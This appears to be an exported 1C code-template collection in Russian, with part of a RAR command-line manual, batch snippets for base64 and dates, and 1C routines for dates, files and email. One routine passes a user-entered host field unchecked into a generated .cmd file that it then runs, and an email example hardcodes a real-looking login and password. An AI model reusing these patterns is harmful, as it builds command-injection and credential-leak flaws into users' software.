Set priority and sleep time. Available only in RAR for Windows.
This switch regulates system load by RAR in multitasking
environment. Possible task priority <p> values are 0 – 15.

If <p> is 0, RAR uses the default task priority.
<p> equal to 1 sets the lowest possible priority,
15 – the highest possible.

Sleep time <s> is a value from 0 to 1000 (milliseconds).
This is a period of time that RAR gives back to the system
after every read or write operation while compressing
or extracting. Non-zero <s> may be useful if you need to reduce
system load even more than can be achieved with <p> parameter.

Example:

execute RAR with default priority and 10 ms sleep time:

rar a -ri0:10 backup *.*

-rr[N]  Add a data recovery record. This switch is used when creating
or modifying an archive to add a data recovery record to
the archive. See the ‘rr[N]’ command description for details.

-rv[N]  Create recovery volumes. This switch is used when creating
a multivolume archive to generate recovery volumes.
See the ‘rv[N]’ command description for details.

-s      Create solid archive. Solid is a special archive type. Please
refer to the appendix “Glossary” for further information.

Example:

create solid archive sources.rar with 512 KB dictionary,
recursing all directories, starting with the current directory.
Add only .asm files:

rar a -s -md512 sources.rar *.asm -r

-s<N>   Create solid groups using file count

Similar to -s, but reset solid statistics after compressing
<N> files. Usually decreases compression, but also
decreases losses in case of solid archive damages.

-sc<charset>[objects]
Specify the character set for list files and archive
comment files.

‘Charset’ parameter is mandatory and can have one
of the following values:

U – Unicode;
A – ANSI (Windows) encoding. Windows version only;
O – OEM (DOS) encoding. Windows version only.

Files in Unicode format must have FFFE or FEFF Unicode
character in the beginning, otherwise RAR will ignore
this switch and process the file as ASCII text.

‘Objects’ parameter is optional and can have one of
the following values:

L – list files;
C – comment files.

It is allowed to specify more than one object, for example,
-scolc. If ‘objects’ parameter is missing, ‘charset’ is applied
to all objects.

This switch allows to specify the character set for files
in -z[file] switch, list files and comment files written by
“cw” command.

Examples:

1) rar a -scol data @list

Read names contained in ‘list’ using OEM encoding.

2) rar c -scuc -zcomment.txt data

Read comment.txt as Unicode file.

3) rar cw -scuc data comment.txt

Write comment.txt as Unicode file.

-se     Create solid groups using extension

Similar to -s, but reset solid statistics if file extension
is changed. Usually decreases compression, but also
decreases losses from solid archive damages.

-sfx[name]
Create SFX archives. If this switch is used when creating a new
archive, a Self-Extracting archive (using a module in file
default.sfx or specified in the switch) would be created.
In the Windows version default.sfx should be placed in the
same directory as the rar.exe, in Unix – in the user’s
home directory, in /usr/lib or /usr/local/lib.

Example:

rar a -sfxwincon.sfx myinst

create SelF-eXtracting (SFX) archive using wincon.sfx
SFX-module.

-si[name]
Read data from stdin (standard input), when creating
an archive. Optional ‘name’ parameter allows to specify
a file name of compressed stdin data in the created
archive. If this parameter is missing, the name will be
set to ‘stdin’. This switch cannot be used with -v.

Example:

type Tree.Far | rar a -siTree.Far tree.rar

will compress ‘type Tree.Far’ output as ‘Tree.Far’ file.

-sl<size>
Process only those files, which size is less than
specified in <size> parameter of this switch.
Parameter <size> must be specified in bytes.

-sm<size>
Process only those files, which size is more than
specified in <size> parameter of this switch.
Parameter <size> must be specified in bytes.

-sv     Create independent solid volumes

By default RAR tries to reset solid statistics as soon
as possible when starting a new volume, but only 
if enough data was packed after a previous reset
(at least a few megabytes).

This switch forces RAR to ignore packed data size and attempt
to reset statistics for volumes of any size. It decreases
compression, but increases chances to extract a part of data 
if one of several solid volumes in a volume set was lost
or damaged.

Note that sometimes RAR cannot reset statistics even
using this switch. For example, it cannot be done when 
compressing one large file split between several volumes.
RAR is able to reset solid statistics only between separate 
files, but not inside of single file.

Ignored if used when creating a non-volume archive.

-sv-    Create dependent solid volumes

Disables to reset solid statistics between volumes.

It slightly increases compression, but significantly reduces 
chances to extract a part of data if one of several solid
volumes in a volume set was lost or damaged.

Ignored if used when creating a non-volume archive.

-s-     Disable solid archiving

-t      Test files after archiving. This switch is especially
useful in combination with the move command, so files will be
deleted only if the archive had been successfully tested.

-ta<date>
Process only files modified after the specified date.

Format of the date string is YYYYMMDDHHMMSS.
It is allowed to insert separators like ‘-‘ or ‘:’ to
the date string and omit trailing fields. For example,
the following switch is correct: -ta2001-11-20
Internally it will be expanded to -ta20011120000000
and treated as “files modified after 0 hour 0 minutes
0 seconds of 20 November 2001″.

-tb<date>
Process only files modified before the specified date.
Format of the switch is the same as -ta<date>.

-tk     Keep original archive date. Prevents RAR from modifying the
archive date when changing an archive.

-tl     Set archive time to newest file. Forces RAR to set the date of a
changed archive to the date of the newest file in the archive.

-tn<time>
Process files newer than the specified time period. Format
of the time string is:

[<ndays>d][<nhours>h][<nminutes>m][<nseconds>s]

For example, use switch -tn15d to process files newer
than 15 days and -tn2h30m to process files newer than
2 hours 30 minutes.

-to<time>
Process files older than the specified time period. Format
of the switch is the same as -tn<time>.

-ts<m,c,a>[N]
Save or restore file time (modification, creation, access).

Switch -tsm instructs RAR to save file modification time,
-tsc – creation time and tsa – last access time. Optional
parameter after the switch is the number between 0 and 4
controlling the file time precision. Value ‘1’ enables
1 second precision, 2 – 0.0065536 sec, 3 – 0.0000256 sec and
4 or ‘+’ enables the maximum NTFS time precision, which is
equal to 0.0000001 sec. Value ‘0’ or ‘-‘ means that creation
and access time are not saved and low (two seconds) precision
is used for modification time. Higher precision modes add
more data to archive, up to 19 additional bytes per file
in case of -tsm4 -tsa4 -tsc4 combination. If no precision
is specified, RAR uses ‘4’ (high) value.

Default RAR mode is -tsm4 -tsc0 -tsa0, so modification time
is stored with the high precision and other times are ignored.

It is necessary to specify -tsc and -tsa switches to set
creation and access time when unpacking files (precision
is irrelevant, but must not be 0). By default RAR sets
only the modification time, even if archive contains
creation and last access time. Setting the modification
time to unpacked files may be also disabled with -tsm-.

It is possible to omit the time type letter if you need
to apply the switch to all three times. For example,
-tsm4 -tsa4 -tsc4 can be replaced by -ts4, -ts+ or -ts.
Use -ts- to save only the low precision modification time
or to ignore all three file times on unpacking.

When creating an archive, RAR automatically reduces
the precision if high mode is not supported by the file
system. It is not more than 2 seconds on FAT and 1 second
in Unix. NTFS time precision is 0.0000001 second.

Operating systems limit which time can be set on unpacking.
Windows allows to set all three times, Unix – modification
and last access, but not creation, DOS supports only
the modification time.

Examples:

1) rar a -ts backup

Store all file times with the highest possible precision.

2) rar x -tsa backup

Restore modification and last access time. Switch -tsm
is not required, because RAR uses it by default.

3) rar a -tsm1 -tsc1 backup

Store low precision modification and creation time.
Without -tsm1 RAR would save the high precision modification
time.

-u      Update files. May be used with archive extraction or creation.
The command string “a -u” is equivalent to the command ‘u’, you
could also use the switch ‘-u’ with the commands ‘m’ or ‘mf’. If
the switch ‘-u’ is used with the commands ‘x’ or ‘e’, then files
not present on the disk and files newer than their copies on the
disk would extracted from the archive.

-v      Create volumes with size autodetection or list all volumes

This switch may be used when creating or listing volumes.

In the first case it enables volume size autodetection,
so new volumes will use all available space on the destination
media. It is convenient when creating volumes on removable
disks. You may read more about volumes in -v<size> description.

In the second case, when this switch is used together with
‘V’ or ‘L’ command, it forces RAR to list contents of all
volumes starting from that specified in the command line.
Without this switch RAR displays contents of only one single
specified volume.

-v<size>[k|b|f|m|M|g|G]
Create volumes with size=<size>*1000 [*1024 | *1].
By default this switch uses <size> as thousands (1000) of bytes
(not 1024 x bytes). You may also enter the size in kilobytes
using the symbol ‘k’, in bytes using the symbol ‘b’,
megabytes – ‘m’, millions of bytes – ‘M’, gigabytes – ‘g’,
billions (milliards) of bytes – ‘G’ or select one of several
predefined values using the symbol ‘f’ following the numerical
value. Predefined values can be 360, 720, 1200, 1440 or 2880
and replaced with corresponding floppy disk size.

If the size is omitted, autodetection will be used.

You may specify several -v switches to set different sizes
for different volumes. For example:

rar a -v100k -v200k -v300k arcname

sets 100 KB size for first volume, 200 KB for second
and 300 KB for all following volumes.

If volumes are created on removable media, then after
the creation of the first volume, the user will be prompted
with:

Create next volume: Yes/No/All

At this moment in time, you should change the disks. Answering
‘A’ will cause all volumes to be created without a pause.

By default RAR volumes have names like ‘volname.partNNN.rar’,
where NNN is the volume number. Using -vn switch it is 
possible to switch to another, extension based naming scheme,
where the first volume file in a multi-volume set has
the extension .rar, following volumes are numbered from .r00
to .r99.

When extracting or testing a multi-volume archive you must use
only the first volume name. If there is no next volume
on the drive and the disk is removable, the user will be
prompted with:

Insert disk with <next volume name>

Insert the disk with the correct volume and press any key.

If while extracting, the next volume is not found and volumes
are placed on the non-removable disk, RAR will abort with
the error message:

Cannot find <volume name>

Archive volumes may not be modified. The commands ‘d’, ‘f’, ‘u’,
‘s’ cannot be used with Multi-volume sets. The command ‘a’ may
be used only for the creation of a new multi-volume sequence.

It is possible, although unlikely, that the file size, of a file
in a multi-volume set, could be greater than its uncompressed
size. This is due to the fact that ‘storing’ (no compression if
size increases) cannot be enabled for multi-volume sets.

Archive volumes may be Self-Extracting (SFX). Such an archive
should be created using both the ‘-v’ and ‘-sfx’ switches.

Example:

create archive in volumes of fixed size:

rar a -s -v1440 floparch.rar *.*

will create solid volumes of size 1440000 bytes.

-vd     Erase disk contents before creating volume

All files and directories on the target disk will be erased
when ‘-vd’ is used.  The switch applies only to removable
media, the hard disk cannot be erased using this switch.

-ver[n] File version control

Forces RAR to keep previous file versions when updating
files in the already existing archive. Old versions are
renamed to ‘filename;n’, where ‘n’ is the version number.

By default, when unpacking an archive without the switch
-ver, RAR extracts only the last added file version, the name
of which does not include a numeric suffix. But if you specify
a file name exactly, including a version, it will be also
unpacked. For example, ‘rar x arcname’ will unpack only
last versions, when ‘rar x arcname file.txt;5’ will unpack
‘file.txt;5’, if it is present in the archive.

If you specify -ver switch without a parameter when unpacking,
RAR will extract all versions of all files that match
the entered file mask. In this case a version number is
not removed from unpacked file names. You may also extract
a concrete file version specifying its number as -ver parameter.
It will tell RAR to unpack only this version and remove
a version number from file names. For example,
‘rar x -ver5 arcname’ will unpack only 5th file versions.

If you specify ‘n’ parameter when archiving, it will limit
the maximum number of file versions stored in the archive.
Old file versions exceeding this threshold will be removed.

-vn     Use the old style volume naming scheme

By default RAR volumes have names like ‘volname.partNNN.rar’,
where NNN is the volume number. Using -vn switch it is 
possible to switch to another, extension based naming scheme,
where the first volume file in a multi-volume set has
the extension .rar, following volumes are numbered from .r00
to .r99. It may have sense, if you are going to unpack
an archive under the plain MS DOS, which does not allow
more than one dot in a file name.

-vp     Pause before each volume

By default RAR asks for confirmation before creating or 
unpacking next volume only for removable drives.
This switch forces RAR to ask such confirmation always.
It can be useful if disk space is limited and you wish
to copy each volume to another media immediately after
creation.

-w<p>   Assign work directory as <p>. This switch may be used to assign
the directory for temporary files.

-x<f>   Exclude specified file <f>, wildcards may be used both
in the name and file parts of file mask. You may specify
the switch ‘-x’ several times.

If mask contains wildcards, it applies to current directory
and its subdirectories. It is not recursive without wildcards,
so if you wish to exclude some “filename” in all directories,
you need to specify two masks: “filename” for current directory
and “*\filename” for subdirectories. If you know an exact path
to file, you can use “path\filename” syntax to exclude only
this copy of “filename”. If you use -xpath\filename syntax
when unpacking an archive, “path” must be a path inside of
archive, not a file path on the disk after unpacking.

Examples:

1) rar a -r -x*.bak -x*.rar rawfiles

*.bak and *.rar files will not be added to rawfiles

2) rar a -r -x*\temp -x*\temp\* savec c:\*

compress all files on the disk c: except temp directories
and files inside of temp directories

3) rar x -x*.txt docs

extract all files except *.txt from docs.rar

-x@<lf> Exclude files listed in the specified list file. If you use -x@
without the list file name parameter, it will read file names
from stdin.

Example:

rar a -x@exlist.txt arch *.exe

-y      Assume Yes on all queries.

-z[f]   Read archive comment from file <f>. Use with -sc switch
if you need to specify the character set for comment text file.
If <f> is not specified, comment is read from stdin.

Limitations
~~~~~~~~~~~

Pathname is limited to 259 symbols.

Maximum archive comment length is 62000 bytes.

Command limitations:

The commands ‘d’,’u’,’f’,’c’,’cf’ will not operate with archive
volumes.

The command ‘a’ cannot be used to update an archive volume, only to
create a new one.

Exit values
~~~~~~~~~~~

RAR exits with a zero code (0) in case of successful operation. The exit
code of non-zero means the operation was cancelled due to an error:

255   USER BREAK       User stopped the process

9   CREATE ERROR     Create file error

8   MEMORY ERROR     Not enough memory for operation

7   USER ERROR       Command line option error

6   OPEN ERROR       Open file error

5   WRITE ERROR      Write to disk error

4   LOCKED ARCHIVE   Attempt to modify an archive previously locked
by the ‘k’ command

3   CRC ERROR        A CRC error occurred when unpacking

2   FATAL ERROR      A fatal error occurred

1   WARNING          Non fatal error(s) occurred

0   SUCCESS          Successful operation

Glossary
~~~~~~~~

Archive      Special file containing one or more files optionally
compressed and/or encrypted.

Compression  A method of encoding data to reduce it’s size.

CRC          Cyclic Redundancy Check. Mathematical method calculating
special checking information for data validity.

SFX          Archive module used to extract files from when executed.
(SelF-eXtracting module), usually in the form of a .EXE
file.

Solid        An archive packed using a special compression method which
sees all files as one continuous data stream. Particularly
advantageous when packing a large number of small files.

Volume       Part of a split archive. Splitting an archive to volumes
allows storing them on diskettes. Solid volumes must be
extracted starting from first in sequence.

Copyrights

(c) 1993-2010 Alexander Roshal"}
},
{0,
{"CMD параметры (перетаскиванием файла)",0,0,"","@: Установка русской кодировки
chcp 1251

For %%i In (%*) Do (
	rem здесь, вместо Echo, вставить Ваше ""конвертирование""
	@Echo %%i
	@Echo %%~ni
)
Pause"}
},
{0,
{"Добавить собственный ярлык на программу в меню ""Отправить""",0,0,"","Чтобы добавить собственный ярлык на программу в меню ""Отправить"",

в Пуск – Поиск введите shell:sendto. Откроется папка SendTo, содержащая ярлыки меню ""Отправить"".
создайте здесь ярлык к программе, в которой вы хотите открывать файлы.
Если добавить в SendTo файл cmd - он выполнится с адресом переданного файла, если добавить ярлык, то все адреса будут связаны с реальным местом файла cmd.
	
В Файле параметры для указания файла:
For %%i In (%*) Do (
	rem здесь, вместо Echo, вставить Ваше ""конвертирование""
	@Echo %%i
	@Echo %%~ni
)

"}
},
{0,
{"Шифрование кодировать/декодировать файл в base64 (через certutil)",0,0,"","Кодировать:
certutil -encode data.txt data_encoded.txt
или
certutil -f -encode data.txt data_encoded.txt
The -f means ""force overwrite""
или
certutil -encode data.txt tmp.b64 && findstr /v /c:- tmp.b64 > data_encoded.b64

Декодировать:
certutil -decode data_encoded.txt data.txt"}
},
{0,
{"Шифровать Base64 (перетаскиванием)",0,0,"","Шифровать в Base64:
@echo off

@: Установка русской кодировки
chcp 1251

echo Расшифровать из Base64
For %%i In (%*) Do (
	echo %%i
	set FileName = %%~ni_encoded
	certutil -f -encode %%i %%~ni_encoded.txt
	echo %%~ni_encoded.txt
)
Pause

Расшифровать из Base64:
@echo off

@: Установка русской кодировки
chcp 1251

echo Расшифровать из Base64
For %%i In (%*) Do (
	echo %%i
	set FileName = %%~ni_encoded
	certutil -f -decode %%i %%~ni_decoded.txt
	echo %%~ni_decoded.txt
)
Pause"}
},
{0,
{"Текущая дата",0,0,"","set day=%DATE:~0,2%
set month=%DATE:~3,2%
set year=%DATE:~6,4%

set hour=%TIME:~0,2%
set minute=%TIME:~3,2%
set second=%TIME:~6,2%

echo %day%
echo %month%
echo %year%

echo %hour%
echo %minute%
echo %second%

set YYYYMMDD=%year%%month%%day%

echo %YYYYMMDD%"}
},
{0,
{"Создать папку с текущей датой, если её нет (mkdir)",0,0,"","set curr_date=%date:~6,4%%date:~3,2%%date:~0,2%
if not exist ""C:\%curr_date%"" mkdir ""C:\%curr_date%"""}
},
{0,
{"Получение нужных частей из полного адреса к файлу",0,0,"","%~I         - expands %I removing any surrounding quotes ("")
%~fI        - expands %I to a fully qualified path name
%~dI        - expands %I to a drive letter only
%~pI        - expands %I to a path only
%~nI        - expands %I to a file name only
%~xI        - expands %I to a file extension only
%~sI        - expanded path contains short names only
%~aI        - expands %I to file attributes of file
%~tI        - expands %I to date/time of file
%~zI        - expands %I to size of file

The modifiers can be combined to get compound results:
%~dpI       - expands %I to a drive letter and path only
%~nxI       - expands %I to a file name and extension only
%~fsI       - expands %I to a full path name with short names only

Иногда может потребоваться два процента в названии: %%~nI"}
},
{0,
{"Создание и выполнение файла скрипта (УстановитьДоменноеИмя)",0,0,"","&НаКлиенте
Процедура УстановитьДоменноеИмя()
	
	Если ЭтоДоменноеИмя(Объект.IP) Тогда
		Объект.ЭтоДоменноеИмя = Истина;
		
		Каталог 	= КаталогВременныхФайлов();
		
		ПутьКоманды = Каталог + ""RDPClient_nslookup.cmd"";
		ПутьФайла	= Каталог + ""nslookup.txt"";
		
		WshShell = Новый COMОбъект(""WScript.Shell"");
		ФайлКоманды = Новый ТекстовыйДокумент;
		
		лТекстКоманды 	= 
		""@echo off
		|nslookup "" + Объект.IP + "" >> """""" + ПутьФайла + """""""";
		
		ФайлКоманды.УстановитьТекст(лТекстКоманды);
		
		Попытка
			
			ФайлКоманды.Записать(ПутьКоманды);
			WshShell.Run(ПутьКоманды, 0, -1);
			ФайлКоманды.Прочитать(ПутьФайла);
			
		Исключение
			лСообщениеОшибки 	= ""При записи или выполнении командного файла произошла ошибка: "" + ОписаниеОшибки();
			ЗаписьЖурналаРегистрацииНаСервере(Объект.Ссылка, лСообщениеОшибки);
			//Сообщить(лСообщениеОшибки, СтатусСообщения.Информация);
			Объект.ЭтоДоменноеИмя 	= Ложь;
			Возврат;
		КонецПопытки; 
		
		Для Счетчик = 1 По ФайлКоманды.КоличествоСтрок() Цикл
			СтрокаЧтения = СокрЛП(ФайлКоманды.ПолучитьСтроку(Счетчик));
			
			Если ЗначениеЗаполнено(СтрокаЧтения) И СтрНайти(СтрокаЧтения, Объект.IP) > 0 Тогда
				Объект.IP_ДоменногоИмени = СокрЛП(Сред(СокрЛП(ФайлКоманды.ПолучитьСтроку(Счетчик +1)),9));
				Прервать;
			КонецЕсли;
		КонецЦикла;
		
		Попытка
			
			УдалитьФайлы(ПутьКоманды);
			УдалитьФайлы(ПутьФайла);
			
		Исключение
		КонецПопытки;
		
		Если ЗначениеЗаполнено(Объект.Ссылка) Тогда
			Записать();
		КонецЕсли;
	Иначе
		Объект.ЭтоДоменноеИмя = Ложь;
	КонецЕсли;
	
КонецПроцедуры

&НаСервереБезКонтекста
Процедура ЗаписьЖурналаРегистрацииНаСервере(пСсылка, пСообщениеОшибки = """")
	
	ЗаписьЖурналаРегистрации(""RDP_Client_УчётныеЗаписи.IPПриИзменении"", УровеньЖурналаРегистрации.Информация,, пСсылка, пСообщениеОшибки);
	
КонецПроцедуры // ЗаписьЖурналаРегистрацииНаСервере()

&НаСервереБезКонтекста
Функция ЭтоДоменноеИмя(Знач ТекСтр)
	
	ТекСтр = СтрЗаменить(ТекСтр, ""."", """");
	ТекСтр = СтрЗаменить(ТекСтр, ""-"", """");
	ТекСтр = СтрЗаменить(ТекСтр, "" "", """");
	
	Для Счетчик = 1 По СтрДлина(ТекСтр) Цикл
		СимволПроверки = КодСимвола(Сред(ТекСтр, Счетчик, 1));
		
		Если (СимволПроверки > 64 И СимволПроверки < 91) ИЛИ
			(СимволПроверки > 96 И СимволПроверки < 123) Тогда
			Возврат Истина;
		КонецЕсли;
	КонецЦикла;
	
	Возврат Ложь;
	
КонецФункции"}
}
},
{2,
{"Текстовый документ",1,0,"",""},
{0,
{"Текстовый документ",0,0,"","Процедура ТестСообщение(ПутьКПапке = ""D:\"", ИмяФайла = ""1C_Test"", Инфо = """", ДописатьВФайл = """")
	
	ТекДата 		= ТекущаяДата();
	ТекДатаСтрока 	= Формат(ТекДата, ""ДФ='yyyy-MM-dd HH-mm-ss'"");
	Пользователь 	= ИмяПользователя();
	
	ТекстТест 		= ТекДатаСтрока + Пользователь + "" "" + ?(НЕ ПустаяСтрока(Инфо), Инфо + "" "", """") + ДописатьВФайл;
	ТекстДок = Новый ТекстовыйДокумент;
	ТекстДок.ДобавитьСтроку(ТекстТест);
	
	//СетевоеИмяКомпьютера = ИмяКомпьютера();
	//Путь  = ""\\"" + СетевоеИмяКомпьютера + ""\шаблоны\word.doc"";
	ПутьКФайлу = ПутьКПапке + ИмяФайла + ""_"" + ТекДатаСтрока + "".txt""; // Путь сохранения файла
	ТекстДок.Записать(ПутьКФайлу);
	ТекстДок = Неопределено;
	
КонецПроцедуры"}
},
{0,
{"Прочитать построчно файл",0,0,"","Путь =  ИмяФайла;
Текст = Новый ЧтениеТекста(Путь);
Стр = Текст.ПрочитатьСтроку();
Пока Стр <> Неопределено Цикл
	Стр = Текст.ПрочитатьСтроку();
	Если НайтиЗ(Стр,""Продан"") Тогда
		Сообщить(Стр);
	КонецЕсли;    
КонецЦикла;"}
}
},
{9,
{"Дата",1,0,"",""},
{0,
{"ТекущаяДата",0,0,"ТекД=","ТекДата = ТекущаяДата();"}
},
{0,
{"ТекущаяДата()",0,0,"ТекД[ата]","ТекущаяДата()"}
},
{0,
{"ТекущаяДата  yyyy-MM-dd HH-mm-ss",0,0,"текДатаФ[ормат]","ТекДата = Формат(ТекущаяДата(), ""ДФ='yyyy-MM-dd HH-mm-ss'"");"}
},
{0,
{"Месяц прописью",0,0,"","Функция ПолучитьМесяцПрописью(КоличествоМесяцев)
	
	Если КоличествоМесяцев <= 0 Тогда
		Возврат ""месяца"";
	ИначеЕсли Окр(КоличествоМесяцев) <> КоличествоМесяцев Тогда
		Возврат ""месяца"";
	ИначеЕсли КоличествоМесяцев > 4 
		И КоличествоМесяцев < 21 Тогда 
		Возврат ""месяцев"";
	ИначеЕсли КоличествоМесяцев % 10 = 1 Тогда 
		Возврат ""месяц"";
	ИначеЕсли КоличествоМесяцев % 10 = 2
		ИЛИ КоличествоМесяцев % 10 = 3
		ИЛИ КоличествоМесяцев % 10 = 4 Тогда
		Возврат ""месяца"";
	ИначеЕсли КоличествоМесяцев % 10 = 5
		ИЛИ КоличествоМесяцев % 10 = 6
		ИЛИ КоличествоМесяцев % 10 = 7
		ИЛИ КоличествоМесяцев % 10 = 8
		ИЛИ КоличествоМесяцев % 10 = 9
		ИЛИ КоличествоМесяцев % 10 = 0 Тогда
		Возврат ""месяцев"";
	Иначе
		Возврат ""месяц"";
	КонецЕсли;	
	
КонецФункции
"}
},
{0,
{"РазобратьРазностьДат",0,0,"","//Типовая из ОМ -\ ОбщегоНазначения

// Процедура вычисляет количество лет, месяцев и дней между двумя датами
// Параметры
//  Дата1    – дата, первая дата (более поздняя, часто текущая, стаж определяется по состоянию на эту дату)
//  Дата2    – дата, вторая дата (ранняя дата, с нее начинается ""течение"" стажа)
//  Лет        – Число, в этот параметр будет записано кол-во лет между двумя датами (Дата1-Дата2)
//  Месяцев    – Число, в этот параметр будет записано кол-во месяцев между двумя датами (Дата1-Дата2)
//  Дней    – Число, в этот параметр будет записано кол-во дней между двумя датами (Дата1-Дата2)
Процедура РазобратьРазностьДат(Дата1, Дата2, Лет = 0, Месяцев = 0, Дней = 0) Экспорт
	
	Лет        	= 0;
	Месяцев    	= 0;
	Дней    	= 0;
	
	Если Дата1 > Дата2 Тогда
		ВременнаяДата = Дата1;
		
		Если День(ВременнаяДата) < День(Дата2) Тогда
			Дней = (ВременнаяДата - ДобавитьМесяц(ВременнаяДата, -1)) / 86400;
			ВременнаяДата = ДобавитьМесяц(ВременнаяДата, -1);
		КонецЕсли;
		
		Если Месяц(ВременнаяДата) < Месяц(Дата2) Тогда
			ВременнаяДата = ДобавитьМесяц(ВременнаяДата, -12);
			Месяцев = 12;
		КонецЕсли;
		
		Лет        = Макс(             Год(ВременнаяДата)        - Год(Дата2),    0);
		Месяцев    = Макс(Месяцев    + Месяц(ВременнаяДата)    - Месяц(Дата2),    0);
		Дней    = Макс(Дней        + День(ВременнаяДата)    - День(Дата2),    0);
		
		// скорректируем отображаемое значение, если ""вмешалось"" разное количество дней в месяцах
		
		Если Дата2 <> (ДобавитьМесяц(Дата1, -Лет * 12 - Месяцев) - Дней * 86400) Тогда
			Дней = Дней + (День(КонецМесяца(Дата2)) - День(НачалоМесяца(Дата2))) - (День(КонецМесяца(ДобавитьМесяц(Дата1, -1))) - День(НачалоМесяца(ДобавитьМесяц(Дата1, -1))));
		КонецЕсли;
	КонецЕсли;
	
КонецПроцедуры    // РазобратьРазностьДат"}
},
{0,
{"РазобратьРазностьДат в красивый результат",0,0,""," Процедура ТЕСТ_ВыполнитьНажатие(Кнопка)
	 
	ДатаНач = Дата(2009, 12, 31);
	ДатаКон = Дата(2005, 1, 10); 
	Лет		= 0; Мес=0; Дн=0;	
	РазобратьРазностьДат(ДатаНач, ДатаКон, Лет, Мес, Дн);
	
	ЛетС 	= ФормаМножественногоЧисла(""год""	,""года""		,""лет""		,Лет);	
	МесС 	= ФормаМножественногоЧисла(""месяц""	,""месяца""	,""месяцев""	,Мес);
	ДнС 	= ФормаМножественногоЧисла(""день""	,""дня""		,""дней""		,Дн);
	
	Результат = ?(Лет>0,Строка(Лет)+"" ""+ЛетС,"""")+"" ""+?(Мес>0,Строка(Мес)+"" ""+МесС,"""")+"" ""+Строка(дн)+"" ""+ДнС;
	
	Сообщить(Результат);
	// Результат будет : 4 года 11 месяцев 21 день

КонецПроцедуры

// Сформировать множественное число
Функция ФормаМножественногоЧисла(Слово1, Слово2, Слово3, Знач ЦелоеЧисло) 
	
	// Изменим знак целого числа, иначе отрицательные числа будут неправильно преобразовываться
	Если ЦелоеЧисло < 0 Тогда
		ЦелоеЧисло = -1 * ЦелоеЧисло;
	КонецЕсли;
	
	Если ЦелоеЧисло <> Цел(ЦелоеЧисло) Тогда 
		// для нецелых чисел - всегда вторая форма
		Возврат Слово2;
	КонецЕсли;
	
	// остаток
	Остаток = ЦелоеЧисло % 10;
	Если (ЦелоеЧисло > 10) И (ЦелоеЧисло < 20) Тогда
		// для второго десятка - всегда третья форма
		Возврат Слово3;
	ИначеЕсли Остаток = 1 Тогда
		Возврат Слово1;
	ИначеЕсли (Остаток > 1) И (Остаток < 5) Тогда
		Возврат Слово2;
	Иначе
		Возврат Слово3;
	КонецЕсли;

КонецФункции    "}
},
{0,
{"РазницаВДнях",0,0,"","РазницаВДнях = (НачалоДня(ДатаОкончания) - НачалоДня(ДатаНачала)) / (60 * 60 * 24);"}
},
{0,
{"Дата начальная (нулевая)",0,0,"ДатаН","Дата(1, 1, 1)"}
},
{2,
{"Приведение к секундам",1,0,"",""},
{0,
{"Приведение к секундам (общее инфо)",0,0,"","Миллисекунда 	= 0.001 секунд
Минута 			= 60 секунд
30 минут 		= 60 * 30 = 1800 секунд
Час 			= 60 * 60 = 3600 секунд
Сутки 			= 60 * 60 * 24 = 86400 секунд
Неделя 			= 60 * 60 * 24 * 7 = 604800 секунд"}
},
{0,
{"Приведение к секундам",0,0,"Секун[да]","<?""Выберите размерность"", ВыборВарианта, ""Миллисекунда"", ""0.001"", ""Минута"", ""60"", ""30 минут"", ""60 * 30"", ""Час"", ""60 * 60"", ""Сутки"", ""60 * 60 * 24"", ""Неделя"", ""60 * 60 * 24 * 7"">"}
}
}
},
{3,
{"Почта",1,0,"",""},
{0,
{"Почта полностью",0,0,"","&НаСервере 
Процедура УстановитьСоединение()    
    Профиль = Новый ИнтернетПочтовыйПрофиль;
    Профиль.АдресСервераSMTP = ""smtp.mail.ru"";
    Профиль.АдресСервераPOP3 = ""pop.mail.ru"";
    Профиль.ПортPOP3 = 110;
    Профиль.ПортSMTP = 587;
    Профиль.Пользователь = ""probasprinter@mail.ru"";
    Профиль.Пароль = ""gfhjkm"";
    Профиль.ПользовательSMTP = ""probasprinter@mail.ru"";
    Профиль.ПарольSMTP = ""gfhjkm"";
    Профиль.АутентификацияSMTP = СпособSMTPАутентификации.ПоУмолчанию; // СпособSMTPАутентификации.Login;
    Почта = Новый ИнтернетПочта;
    
   // Создадим почтовое сообщение
 
    Письмо = Новый ИнтернетПочтовоеСообщение;
    Текст = Письмо.Тексты.Добавить(""Привет"");
    Текст.ТипТекста = ТипТекстаПочтовогоСообщения.ПростойТекст;
    Письмо.Тема = ""Пробное письмо""; 
    Письмо.Отправитель = ""probasprinter@mail.ru""; // Вида йцу@mail.ru
    Письмо.ИмяОтправителя = ""ИмяОтправителя"";
    Письмо.Получатели.Добавить(""qwer@rambler.ru""); // Вида йцу@rambler.ru
    
    Попытка
        Почта.Подключиться(Профиль);
        Сообщить(""Подключенено"");
        Почта.Послать(Письмо);
        Сообщить(""Письма отправлены"");
    Исключение
        Сообщить(""Не удалось подключиться к серверу"");
        Сообщить(ОписаниеОшибки());
    КонецПопытки;
    
    Почта.Отключиться();
    Сообщить(""Соединение завершено"");
КонецПроцедуры"}
},
{0,
{"Почта частью типовой",0,0,"","Функция ОтправитьПисьмо(АдресаПолучателей)
	
	//Профиль 	= Справочники.УчетныеЗаписиЭлектроннойПочты.НайтиПоНаименованию(""Наименование""); // Вида йцу@mail.ru
	Профиль 	= Справочники.УчетныеЗаписиЭлектроннойПочты.СистемнаяУчетнаяЗаписьЭлектроннойПочты;
	Почта 		= Новый ИнтернетПочта;
	
	Письмо 		= Новый ИнтернетПочтовоеСообщение;
	Текст 		= Письмо.Тексты.Добавить(""Тест текста письма программно"");
	Текст.ТипТекста = ТипТекстаПочтовогоСообщения.ПростойТекст;
	Письмо.Тема 	= ""Пробное письмо""; 
	Письмо.Отправитель 		= ""Отправитель""; // Вида йцу@mail.ru
	Письмо.ИмяОтправителя 	= ""ИмяОтправителя"";
	Письмо.Получатели.Добавить(АдресаПолучателей); // Вида йцу@mail.ru
	
	Попытка
		Почта.Подключиться(Профиль);
		Сообщить(""Подключенено"");
		Почта.Послать(Письмо);
		Сообщить(""Письма отправлены"");
	Исключение
		Сообщить(""Не удалось подключиться к серверу"");
		Сообщить(ОписаниеОшибки());
	КонецПопытки;
	
	Почта.Отключиться();
	Сообщить(""Соединение завершено"");
	
КонецФункции // ОтправитьПисьмо()
"}
},
{0,
{"Почта типовой Бух",0,0,"","Функция ОтправитьПисьмо(АдресаПолучателей)
	
	Если ПустаяСтрока(АдресаПолучателей) Тогда
		Возврат Неопределено;
	КонецЕсли; 
	//Профиль = Справочники.УчетныеЗаписиЭлектроннойПочты.НайтиПоНаименованию(""@mail.ru"");
